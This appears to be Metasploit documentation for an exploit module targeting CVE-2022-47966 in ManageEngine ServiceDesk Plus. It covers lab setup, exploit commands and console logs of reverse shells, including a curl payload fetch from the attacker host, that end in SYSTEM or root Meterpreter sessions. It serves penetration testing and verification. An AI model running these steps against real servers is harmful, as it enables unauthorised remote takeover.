## Vulnerable Application

This exploits an unauthenticated remote code execution vulnerability that
affects Zoho ManageEngine ServiceDesk Plus versions 14003 and below
(CVE-2022-47966). Due to a dependency to an outdated library (Apache Santuario
version 1.4.1), it is possible to execute arbitrary code by providing a crafted
`samlResponse` XML to the ServiceDesk Plus SAML endpoint. Note that the target
is only vulnerable if it has been configured with SAML-based SSO at least once
in the past, regardless of the current SAML-based SSO status.


## Installation

### SAML 2.0 Identity Provider
If you don't have an already SAML 2.0 Identity Provider (IdP), you can use this
free one for testing: https://mocksaml.com/

Save the certificate to a local file (e.g. `cert.cer`) and take note of the SSO
URL (`https://mocksaml.com/api/saml/sso`).

### Download the installers
Go to https://archives.manageengine.com/, fill the form with any data and
select ServiceDesk Plus product with any version (e.g. `14003`). You can then
have access to all the versions and platform installers.

### Windows
1. Launch the Windows installer and select all the default options by clicking
   `Next` (you can skip the Registration for Technical Support part, it is
   optional). When the installation is done, select `Start ServiceDesk Server`
   and click `Finish`
1. Go to `C:\Program Files\ManageEngine\ServiceDesk\bin\` and run `SDPLaunch`.
   This will start a browser and get you to the login page.

### Linux (Ubuntu)
1. Make the installer executable executing `chmod +x <linux_installer>.bin`
1. Launch the Linux installer as root, select all the default options by
   clicking `Next` until you reach the installation path page.
1. Change the installation path to somewhere else than under `/root/` (it
   doesn't work with this default path) and finish the installation. You might
   get an error 'Problem in initializing Postgres', just ignore it, click `OK`
   and finish the installation. We'll fix this in the next step.
1. If you got the `Postgres` error in the last step, go to the installation
   base path (e.g. '/opt/ManageEngine/ServiceDesk/') and run the following
   commands as root:
    - `cp tools/postgres/bin/gettimezone tools/postgres/bin/gettimezone_32`
    - `cp tools/postgres/bin/gettimezone_64 tools/postgres/bin/gettimezone`
    - `cd bin`
    - `./initPgsql.sh`
1. Start the server running `run.sh`

### Enable SAML 2.0 SSO
1. Go to `http://localhost:8080`
1. Select `Log in as` `Administrator`.
1. Go to `http://localhost:8080/app#/admin` and click on `SAML Single Sign On`
   in the `​​Users & Permission` section.
1. In `Configure Identity Provider Details`, set the SSO URL from the IdP (e.g.
   `https://mocksaml.com/api/saml/sso`), set the `Name ID Format` to
   `Unspecified`, the `Algorithm` to `RSA_SHA1` and select the SiP certificate
   file (e.g. `cert.cer`).
1. In `Additional Claims` > `Default Fields`, set the `Login Name` to any
   value.
1. Click `Save`
1. Enable SSO by switching the `Enable SAML Single Sign-On ?` button on the top
   of the page.


## Verification Steps

1. Start msfconsole
1. Do: `use multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966`
1. Do: `exploit rhosts=<remote host IP> lhost=<local host IP>`
1. You should get a shell
1. Also test with other targets against Windows and Linux


## Options

### TARGETURI
The ServiceDesk Plus SAML endpoint URL. Set to `/SamlResponseServlet` by default.

### DELAY
This sets the number of seconds to wait between each request. It is
particularly useful when using a big payload with the `cmdstager` (Target 0),
which requires sending multiple requests to the target. ServiceDesk Plus has an
anti-DoS mechanism that blocks the source IP address if requests are sent too
fast. This option is set to 5 seconds by default, which seems to be a safe
value.


## Scenarios

### ServiceDesk Plus versions 14003 on Windows - Target 1 (`Windows Command`)
```
msf6 exploit(multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966) > exploit rhosts=192.168.100.104 lhost=192.168.100.1

[*] Started reverse TCP handler on 192.168.100.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Sending stage (175686 bytes) to 192.168.100.104
[*] Meterpreter session 1 opened (192.168.100.1:4444 -> 192.168.100.104:51417) at 2023-01-26 12:07:43 +0100

meterpreter > sysinfo
Computer        : DESKTOP-26CQRHP
OS              : Windows 10 (10.0 Build 22000).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### ServiceDesk Plus versions 14003 on Windows - Target 0 (`Windows EXE Dropper`)
```
msf6 exploit(multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966) > set target 0
target => 0
msf6 exploit(multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966) > exploit rhosts=192.168.100.104 lhost=192.168.100.1

[*] Started reverse TCP handler on 192.168.100.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Command Stager progress -  17.01% done (2046/12025 bytes)
[*] Command Stager progress -  34.03% done (4092/12025 bytes)
[*] Command Stager progress -  51.04% done (6138/12025 bytes)
[*] Command Stager progress -  68.06% done (8184/12025 bytes)
[*] Command Stager progress -  84.24% done (10130/12025 bytes)
[*] Sending stage (200774 bytes) to 192.168.100.104
[*] Meterpreter session 2 opened (192.168.100.1:4444 -> 192.168.100.104:51435) at 2023-01-26 12:08:42 +0100
[*] Command Stager progress - 100.00% done (12025/12025 bytes)

meterpreter > sysinfo
Computer        : DESKTOP-26CQRHP
OS              : Windows 10 (10.0 Build 22000).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### ServiceDesk Plus versions 14003 on Linux (Ubuntu) - Target 2 (`Unix Command`)
```
msf6 exploit(multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966) > set target 2
target => 2
msf6 exploit(multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966) > exploit rhosts=192.168.100.109 lhost=192.168.100.1

[*] Started reverse TCP handler on 192.168.100.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Sending stage (24380 bytes) to 192.168.100.109
[*] Meterpreter session 1 opened (192.168.100.1:4444 -> 192.168.100.109:43062) at 2023-01-26 16:07:21 +0100

meterpreter > sysinfo
Computer        : ubuntu
OS              : Linux 5.15.0-58-generic #64~20.04.1-Ubuntu SMP Fri Jan 6 16:42:31 UTC 2023
Architecture    : x64
System Language : en_US
Meterpreter     : python/linux
meterpreter > getuid
Server username: root
```

### ServiceDesk Plus versions 14003 on Linux (Ubuntu) - Target 2 (`Unix Dropper`)
```
msf6 exploit(multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966) > set target 3
target => 3
msf6 exploit(multi/http/manageengine_servicedesk_plus_saml_rce_cve_2022_47966) > exploit rhosts=192.168.100.109 lhost=192.168.100.1

[*] Started reverse TCP handler on 192.168.100.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Using URL: http://192.168.100.1:8080/55oyjyc1i
[*] Client 192.168.100.109 (curl/7.68.0) requested /55oyjyc1i
[*] Sending payload to 192.168.100.109 (curl/7.68.0)
[*] Sending stage (3045348 bytes) to 192.168.100.109
[*] Meterpreter session 2 opened (192.168.100.1:4444 -> 192.168.100.109:40138) at 2023-01-26 16:09:37 +0100
[*] Command Stager progress - 100.00% done (115/115 bytes)
[*] Server stopped.

meterpreter > sysinfo
Computer     : 192.168.100.109
OS           : Ubuntu 20.04 (Linux 5.15.0-58-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: root
```

